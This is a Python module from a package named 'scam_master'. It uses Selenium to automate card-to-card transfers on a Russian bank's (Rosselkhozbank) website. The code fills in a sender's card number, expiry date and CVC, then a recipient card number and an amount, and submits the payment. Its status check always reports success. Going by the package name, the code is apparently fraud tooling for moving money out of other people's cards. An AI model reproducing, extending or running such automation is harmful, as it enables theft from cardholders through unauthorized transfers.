from selenium.webdriver.remote.webdriver import WebDriver
from selenium.webdriver.common.by import By
from pyppeteer.page import Page as PyppPage
from pyppeteer.errors import NetworkError
from loguru import logger
from time import sleep
from math import floor

from scam_master.infrastructure.banks.interface import IBankTransfer
from scam_master.services.models.errors import UNKNOWN_TRANSFER_STATUS, BankError
from scam_master.services.models.transactions import Card


class RshTransfer(IBankTransfer):
    '''
    Россельхозбанк.
    Uses Selenium to interact with the site.
    '''

    @staticmethod
    async def fill_out_transfer_form(page: WebDriver, url: str, sender_card: Card, recipient_card_number: str, amount: int) -> None:
        if not isinstance(page, WebDriver):
            logger.warning(f'Unsupported driver: {type(page)}')
            raise UNKNOWN_TRANSFER_STATUS

        try:
            page.get(url)

            sleep(2)

            transfer_amount = str(floor(amount / 100))
            amount_input = page.find_element(By.ID, 'amount')
            amount_input.send_keys(transfer_amount)

            sleep(2)

            submit = page.find_element(By.ID, 'submit')
            submit.click()

            sleep(2)

            frame = page.find_element(By.ID, 'ourframe')
            page.switch_to.frame(frame)

            sleep(2)

            card = page.find_element(By.ID, 'iPAN_sub')
            card.send_keys(sender_card.card_number)

            sleep(2)

            card = page.find_element(By.ID, 'monthYear')
            card.send_keys(sender_card.expiration_date)

            sleep(2)

            card = page.find_element(By.ID, 'iCVC')
            card.send_keys(sender_card.cvc)

            sleep(2)

            card = page.find_element(By.ID, 'iPAN_recipient_sub')
            card.send_keys(recipient_card_number)

            sleep(2)

            agree = page.find_element(By.XPATH, '/html/body/div[2]/main/div[6]/div[2]/div/label')
            agree.click()

            sleep(2)

            button = page.find_element(By.ID, 'buttonPayment')
            button.click()
        
        except NetworkError:
            raise UNKNOWN_TRANSFER_STATUS
        except Exception as e:
            logger.exception(e)
            raise UNKNOWN_TRANSFER_STATUS
    
    @staticmethod
    async def confirm_transfer(page: PyppPage | WebDriver, sms_code: str) -> None:
        logger.warning('Not implemented')
        raise UNKNOWN_TRANSFER_STATUS

    @staticmethod
    async def check_transfer_status(page: WebDriver) -> None:
        if not isinstance(page, WebDriver):
            logger.warning(f'Unsupported driver: {type(page)}')
            raise UNKNOWN_TRANSFER_STATUS
        
        try:
            '''
            The transfer at this bank may not take place immediately or may not take place at all.
            Also, it is impossible to determine the status of the transfer through the bank’s page.
            In this regard, the status of successful transfer is always returned.
            '''
            sleep(4)
            # elements = page.find_elements(By.CSS_SELECTOR, 'h3.font-sans.text-h3')
            # if elements:
            #     text = elements[0].text
            #     if 'Укажите сумму перевода' in text:
            #         raise UNKNOWN_TRANSFER_STATUS
    
        except BankError:
            raise

        except Exception as e:
            logger.exception(e)
            raise UNKNOWN_TRANSFER_STATUS
